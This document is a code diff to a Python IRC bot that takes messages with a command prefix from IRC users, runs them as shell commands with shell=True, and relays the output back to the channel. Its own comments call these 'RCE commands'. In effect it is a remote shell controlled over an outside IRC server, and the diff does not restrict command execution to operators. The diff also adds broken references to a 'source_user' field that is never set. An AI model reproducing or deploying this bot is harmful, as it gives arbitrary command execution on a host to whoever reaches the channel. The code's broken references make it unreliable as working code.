@@ -196,10 +196,26 @@ class Server():
         if trailing:
             params.append(trailing)
 
+        # Extract possible user info from prefix
+        if command == "PRIVMSG":
+            message_source = prefix.partition("!")[0]
+
+            # Technically the target is ourselfs, but I change it to be the other user
+            # so other parts of the script can easily use it to know where to send output.
+            if params[0] == self.nickname:
+                target_channel = message_source
+            else:
+                target_channel = params[0]
+        else:
+            message_source = None
+            target_channel = None
+
         return {
             "prefix": prefix,
             "command": command,
-            "params": params
+            "params": params,
+            "message_source": message_source,
+            "target_channel": target_channel
         }
 
     # This is where we handle messages that need to be
@@ -210,13 +226,6 @@ class Server():
 
         # Handle PRIVMSG
         if msg["command"] == "PRIVMSG":
-            msg_source = msg["params"][0]
-            # Properly decode private messages
-            if msg_source == self.nickname:
-                source_channel = msg["prefix"].partition("!~")[0]
-            else:
-                source_channel = msg_source
-
             # Check for command prefix and run it if we got one
             if msg["params"][-1].startswith(self.command_prefix):
                 # Strip command prefix and spaces if any from input
@@ -228,27 +237,27 @@ class Server():
                     return
 
                 # Run CMDTHREAD
-                threading.Thread(target = self._handle_command, args = (cmd, source_channel, )).start()
+                threading.Thread(target = self._handle_command, args = (cmd, msg["target_channel"], )).start()
 
             # Check for bot prefix
             if msg["params"][-1].startswith(self.bot_prefix):
-                # Toggle flood protection in send thread
-                if "slow" in msg["params"][-1]:
-                    if self._msg_slow_down.is_set():
-                        self._msg_q.put(f"PRIVMSG {source_channel} :Flood protection: Disabled\r\n".encode())
-                        self._msg_slow_down.clear()
-                    else:
-                        self._msg_q.put(f"PRIVMSG {source_channel} :Flood protection: Enabled\r\n".encode())
-                        self._msg_slow_down.set()
+                # Send message queue size
                 if "sendq" in msg["params"][-1]:
-                    self._msg_q.put(f"PRIVMSG {source_channel} :Send Queue Size: {self._msg_q.qsize()}\r\n".encode())
+                    self._msg_q.put(f"PRIVMSG {msg['target_channel']} :Send Queue Size: {self._msg_q.qsize()}\r\n".encode())
+
+                # Send main PID
                 if "pid" in msg["params"][-1]:
-                    self._msg_q.put(f"PRIVMSG {source_channel} :Bot PID: {os.getpid()}\r\n".encode())
+                    self._msg_q.put(f"PRIVMSG {msg['target_channel']} :Bot PID: {os.getpid()}\r\n".encode())
+
+                # Kill server
                 if "die" in msg["params"][-1]:
                     self.die()
+                    raise SystemExit(0)
+
+                # Send flooding statistics
                 if "floodstats" in msg["params"][-1]:
-                    self._msg_q.put(f"PRIVMSG {source_channel} :Sleep Time: {self._msg_time}\r\n".encode())
-                    self._msg_q.put(f"PRIVMSG {source_channel} :Message Count: {self._msg_count}\r\n".encode())
+                    self._msg_q.put(f"PRIVMSG {msg['target_channel']} :Sleep Time: {self._msg_time}\r\n".encode())
+                    self._msg_q.put(f"PRIVMSG {msg['target_channel']} :Message Count: {self._msg_count}\r\n".encode())
 
         # Handle nickname already in use by appending the PID
         # and resending user reg
@@ -260,20 +269,18 @@ class Server():
 
         # Allow users to add bots to channel, but only if it's me
         if msg["command"] == "INVITE":
-            msg_source = msg["params"][0]
-            source_user = msg["prefix"].partition("!~")[0]
-            if source_user in self.opper_nicknames:
-                print(f"[RECVTHREAD] Joining channel by user command!")
+            if msg.source_user in self.opper_nicknames:
+                print(f"[RECVTHREAD] Joining channel by opper command from {msg['source_user']}!")
                 self._msg_q.put(f"JOIN {msg['params'][-1]}\r\n".encode())
 
     # This is where we actually run the RCE commands and pipe the output
     # back to IRC.
     #
     # No temp files here
-    def _handle_command(self, cmd, source_channel):
+    def _handle_command(self, cmd, target_channel):
         print(f"[CMDTHREAD] Running CMD {cmd}!")
         proc = subprocess.Popen(cmd, shell = True, stdout = subprocess.PIPE, stderr = subprocess.STDOUT, stdin = subprocess.DEVNULL,
-        start_new_session=False, text=False)
+        start_new_session=True, text=False)
 
         # Calculate maximum message size            
         # 512 bytes is max IRC message with <IRCv3 and no cap neg
@@ -304,11 +311,11 @@ class Server():
             line = line.replace("\r\n", "")
             line = line.replace("\n", "")
 
-            self._msg_q.put(b"PRIVMSG " + source_channel.encode() + b" :" + line.encode() + b"\r\n")
+            self._msg_q.put(b"PRIVMSG " + target_channel.encode() + b" :" + line.encode() + b"\r\n")
 
         # Wait is required to fetch exit code
         proc.wait()
-        self._msg_q.put(f"PRIVMSG {source_channel} :CMD {cmd} exited with returncode {proc.returncode}\r\n".encode())
+        self._msg_q.put(f"PRIVMSG {target_channel} :CMD {cmd} exited with returncode {proc.returncode}\r\n".encode())
 
 if __name__ == "__main__":
     serv = Server("username", "nickname", "##channel", opper_nicknames = ["opperhere"])
